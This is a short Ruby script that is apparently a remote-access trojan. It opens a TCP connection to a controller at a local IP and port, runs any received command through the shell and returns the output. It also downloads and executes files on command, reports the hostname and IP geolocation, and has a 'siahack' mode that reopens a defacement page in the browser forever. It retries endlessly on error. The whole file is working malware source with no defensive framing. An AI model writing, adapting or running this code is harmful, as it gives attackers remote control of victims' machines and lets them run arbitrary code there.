#!/usr/bin/ruby

require "socket"
require "launchy"
require "open-uri"
require "net/http"

host = "192.168.1.104"
port = "8001"

s = TCPSocket.open(host, port)

begin
  while true
    comm = s.gets.chomp

    case comm
    when "siahack"
    
      while true
        #time to open browser :D
        sleep(5)
        Launchy.open("file:///home/virus007/Desktop/sia-payload/deface.html")
      end

      #   Download File 
      #   Setup your download url :D
    when "download"
      #url
      download = open("https://upload.wikimedia.org/wikipedia/commons/6/6e/Sia_Seattle_%28cropped%29.jpg")
      name_file = "sia.jpg"
      IO.copy_stream(download, name_file)

      #Download and run
    when "down-run"
      download = open("https://upload.wikimedia.org/wikipedia/commons/6/6e/Sia_Seattle_%28cropped%29.jpg")
      name_file = "sia.jpg"
      IO.copy_stream(download, name_file)
      #run with shell system :D
      system(name_file)

    when "info"
      #system info
      host = Socket.gethostname
      #ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
      #s.puts("[*] Host name : #{host}")
      #s.puts("[*] Ip Address : #{ip}")
      res = Net::HTTP.get(URI("http://ipinfo.io/json"))
      resf = res.to_s
      s.puts("[*] Host name : #{host}\n\n#{resf}")

    else
      res = %x{#{comm}}
      s.puts(res)
    end
  end

rescue
  retry
end
